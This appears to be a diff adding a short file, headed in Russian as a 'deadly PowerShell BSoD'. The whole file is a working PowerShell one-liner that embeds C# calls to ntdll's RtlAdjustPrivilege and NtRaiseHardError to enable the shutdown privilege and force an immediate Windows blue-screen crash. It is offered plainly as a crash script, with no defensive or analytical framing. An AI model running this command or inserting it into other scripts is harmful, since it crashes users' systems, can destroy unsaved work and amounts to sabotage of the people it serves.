@@ -1,0 +1,15 @@
+# Смертельный PowerShell BSoD
+powershell -c "Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class BSOD {
+    [DllImport(\"ntdll.dll\", SetLastError = true)]
+    public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
+    [DllImport(\"ntdll.dll\", SetLastError = true)]
+    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+}
+'@;
+[bool] \$enabled;
+[uint32] \$response;
+[BSOD]::RtlAdjustPrivilege(19, \$true, \$false, [ref] \$enabled);
+[BSOD]::NtRaiseHardError(0xC0000022, 0, 0, [IntPtr]::Zero, 6, [ref] \$response);"
